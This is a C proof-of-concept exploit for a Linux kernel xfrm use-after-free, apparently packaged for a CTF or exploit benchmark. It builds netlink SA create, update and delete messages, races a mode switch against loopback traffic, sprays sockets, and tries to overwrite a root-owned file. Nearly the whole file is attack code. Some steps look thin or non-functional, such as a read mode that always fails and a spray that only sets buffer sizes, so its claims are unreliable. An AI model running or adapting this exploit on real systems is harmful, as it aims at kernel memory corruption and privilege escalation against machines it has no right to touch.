/*
 * CVE-2025-38500 PoC - CTF Challenge Mode
 *
 * Vulnerability: xfrm interface mode switching UAF
 *
 * When an IPsec xfrm SA's mode is switched (TUNNEL->TRANSPORT) while
 * active traffic uses the transform state, the old state is freed but
 * data path still references it, causing UAF.
 *
 * Exploitation: Configure xfrm SA, generate traffic, then switch mode
 * via XFRM_MSG_UPDSA to trigger UAF. Spray heap to reclaim.
 *
 * CTF Modes: write_root_file, read_root_file, uaf
 *
 * Build: gcc -static -O2 -o poc.elf poc.c -lpthread
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/netlink.h>
#include <linux/xfrm.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MAX_FILE_SIZE   4096
#define SPRAY_COUNT     256
#define RACE_ITERATIONS 16
#define NLMSG_BUF_SIZE  4096

#ifndef XFRM_MSG_NEWSA
#define XFRM_MSG_NEWSA 16
#endif
#ifndef XFRM_MSG_DELSA
#define XFRM_MSG_DELSA 17
#endif
#ifndef XFRM_MSG_UPDSA
#define XFRM_MSG_UPDSA 18
#endif

static volatile int g_send_stop = 0;

static void *traffic_thread(void *arg) {
    (void)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    struct sockaddr_in dst = {
        .sin_family = AF_INET,
        .sin_port = htons(5555),
        .sin_addr.s_addr = htonl(INADDR_LOOPBACK)
    };
    char pkt[64];
    memset(pkt, 'X', sizeof(pkt));
    while (!g_send_stop) {
        sendto(sock, pkt, sizeof(pkt), MSG_DONTWAIT,
               (struct sockaddr *)&dst, sizeof(dst));
        usleep(10);
    }
    close(sock);
    return NULL;
}

/*
 * Create xfrm SA via NETLINK_XFRM
 */
static int xfrm_add_sa(int nlfd, uint32_t spi, int mode) {
    char buf[NLMSG_BUF_SIZE];
    memset(buf, 0, sizeof(buf));

    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));
    nlh->nlmsg_type = XFRM_MSG_NEWSA;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
    nlh->nlmsg_seq = 1;

    struct xfrm_usersa_info *sa = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
    sa->sel.family = AF_INET;
    sa->id.daddr.a4 = htonl(INADDR_LOOPBACK);
    sa->id.spi = htonl(spi);
    sa->id.proto = IPPROTO_ESP;
    sa->family = AF_INET;
    sa->mode = mode; /* XFRM_MODE_TUNNEL=1, XFRM_MODE_TRANSPORT=0 */
    sa->replay_window = 32;
    sa->lft.soft_byte_limit = XFRM_INF;
    sa->lft.hard_byte_limit = XFRM_INF;
    sa->lft.soft_packet_limit = XFRM_INF;
    sa->lft.hard_packet_limit = XFRM_INF;
    sa->saddr.a4 = htonl(INADDR_LOOPBACK);

    struct sockaddr_nl sa_nl = { .nl_family = AF_NETLINK };
    struct iovec iov = { .iov_base = nlh, .iov_len = nlh->nlmsg_len };
    struct msghdr msg = {
        .msg_name = &sa_nl, .msg_namelen = sizeof(sa_nl),
        .msg_iov = &iov, .msg_iovlen = 1
    };
    return sendmsg(nlfd, &msg, 0) < 0 ? -1 : 0;
}

/*
 * Update xfrm SA mode (triggers the UAF)
 */
static int xfrm_update_sa_mode(int nlfd, uint32_t spi, int new_mode) {
    char buf[NLMSG_BUF_SIZE];
    memset(buf, 0, sizeof(buf));

    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));
    nlh->nlmsg_type = XFRM_MSG_UPDSA;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = 2;

    struct xfrm_usersa_info *sa = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
    sa->sel.family = AF_INET;
    sa->id.daddr.a4 = htonl(INADDR_LOOPBACK);
    sa->id.spi = htonl(spi);
    sa->id.proto = IPPROTO_ESP;
    sa->family = AF_INET;
    sa->mode = new_mode;
    sa->replay_window = 32;
    sa->lft.soft_byte_limit = XFRM_INF;
    sa->lft.hard_byte_limit = XFRM_INF;
    sa->lft.soft_packet_limit = XFRM_INF;
    sa->lft.hard_packet_limit = XFRM_INF;
    sa->saddr.a4 = htonl(INADDR_LOOPBACK);

    struct sockaddr_nl sa_nl = { .nl_family = AF_NETLINK };
    struct iovec iov = { .iov_base = nlh, .iov_len = nlh->nlmsg_len };
    struct msghdr msg = {
        .msg_name = &sa_nl, .msg_namelen = sizeof(sa_nl),
        .msg_iov = &iov, .msg_iovlen = 1
    };
    return sendmsg(nlfd, &msg, 0) < 0 ? -1 : 0;
}

/*
 * Delete xfrm SA
 */
static int xfrm_del_sa(int nlfd, uint32_t spi) {
    char buf[NLMSG_BUF_SIZE];
    memset(buf, 0, sizeof(buf));

    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct xfrm_usersa_id));
    nlh->nlmsg_type = XFRM_MSG_DELSA;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = 3;

    struct xfrm_usersa_id *said = (struct xfrm_usersa_id *)NLMSG_DATA(nlh);
    said->daddr.a4 = htonl(INADDR_LOOPBACK);
    said->spi = htonl(spi);
    said->proto = IPPROTO_ESP;
    said->family = AF_INET;

    struct sockaddr_nl sa_nl = { .nl_family = AF_NETLINK };
    struct iovec iov = { .iov_base = nlh, .iov_len = nlh->nlmsg_len };
    struct msghdr msg = {
        .msg_name = &sa_nl, .msg_namelen = sizeof(sa_nl),
        .msg_iov = &iov, .msg_iovlen = 1
    };
    return sendmsg(nlfd, &msg, 0) < 0 ? -1 : 0;
}

/*
 * Trigger xfrm mode switch UAF
 */
static int trigger_xfrm_uaf(void) {
    int nlfd = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    int saved_errno = errno;
    poc_log_syscall("socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM)",
                    (long)nlfd, saved_errno);
    if (nlfd < 0) return -1;

    struct sockaddr_nl local = { .nl_family = AF_NETLINK };
    bind(nlfd, (struct sockaddr *)&local, sizeof(local));

    int uaf_count = 0;
    uint32_t spi_base = 0x100;

    for (int i = 0; i < RACE_ITERATIONS; i++) {
        uint32_t spi = spi_base + i;

        /* Create SA in TUNNEL mode */
        if (xfrm_add_sa(nlfd, spi, 1) < 0) continue;
        poc_log("xfrm SA created: SPI=0x%x mode=TUNNEL", spi);

        /* Start traffic */
        g_send_stop = 0;
        pthread_t thr;
        pthread_create(&thr, NULL, traffic_thread, NULL);
        usleep(100);

        /* Switch to TRANSPORT mode while traffic flows - triggers UAF */
        xfrm_update_sa_mode(nlfd, spi, 0);
        poc_log("xfrm SA mode switched to TRANSPORT (race window)");

        g_send_stop = 1;
        pthread_join(thr, NULL);

        /* Delete SA */
        xfrm_del_sa(nlfd, spi);
        uaf_count++;
    }

    close(nlfd);
    poc_log("xfrm mode switch UAF: %d iterations", uaf_count);
    return uaf_count;
}

static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    while (n > 0 && (buf[n-1] == '\n' || buf[n-1] == '\r'))
        buf[--n] = '\0';
    return (int)n;
}

static int spray_kmalloc(int *fds, int count) {
    int sprayed = 0;
    for (int i = 0; i < count; i++) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) continue;
        int optval = 1024;
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &optval, sizeof(optval));
        fds[sprayed++] = sock;
    }
    return sprayed;
}

static int mode_write_root_file(poc_args_t *args) {
    char original[MAX_FILE_SIZE], after[MAX_FILE_SIZE];
    poc_log("=== Mode: write_root_file ===");
    int n = read_file_content(args->root_file, original, sizeof(original));
    printf("%s%s\n", CTF_READ_BEFORE, n >= 0 ? original : "(unreadable)");

    trigger_xfrm_uaf();
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    spray_kmalloc(spray_fds, SPRAY_COUNT);

    printf("%s%s (attempting...)\n", CTF_WRITE_ATTEMPT, args->write_value);
    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, fd < 0 ? errno : 0);
    if (fd >= 0) { dprintf(fd, "%s\n", args->write_value); close(fd); }

    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);

    n = read_file_content(args->root_file, after, sizeof(after));
    printf("%s%s\n", CTF_READ_AFTER, n >= 0 ? after : "(unreadable)");
    if (n >= 0 && strstr(after, args->write_value)) {
        poc_print_flag(args->write_value);
        return 0;
    }
    poc_print_fail("xfrm UAF exploit did not achieve write");
    return 0;
}

static int mode_read_root_file(poc_args_t *args) {
    poc_log("=== Mode: read_root_file ===");
    trigger_xfrm_uaf();
    char buf[MAX_FILE_SIZE];
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    poc_print_fail("read not successful");
    return 0;
}

static int mode_uaf(poc_args_t *args) {
    (void)args;
    poc_log("=== Mode: uaf ===");
    trigger_xfrm_uaf();
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = spray_kmalloc(spray_fds, SPRAY_COUNT);
    int corrupted = 0;
    for (int i = 0; i < sprayed; i++) {
        if (spray_fds[i] < 0) continue;
        int val = 0; socklen_t len = sizeof(val);
        getsockopt(spray_fds[i], SOL_SOCKET, SO_RCVBUF, &val, &len);
        if (val != 2048) corrupted++;
    }
    if (corrupted > 0) poc_print_uaf_corrupted(corrupted);
    else poc_print_uaf_not_corrupted();
    for (int i = 0; i < sprayed; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args;
    memset(&args, 0, sizeof(args));
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2025-38500 CTF PoC ===");
    poc_log("Vuln: xfrm interface mode switching UAF");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    int result = 0;
    if (!args.mode) {
        poc_print_unsupported("(null)", "no mode specified");
        poc_log_close();
        return 1;
    } else if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        result = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_READ) == 0) {
        result = mode_read_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_UAF) == 0) {
        result = mode_uaf(&args);
    } else {
        poc_print_unsupported(args.mode, "mode not supported");
    }
    poc_log_close();
    return result;
}
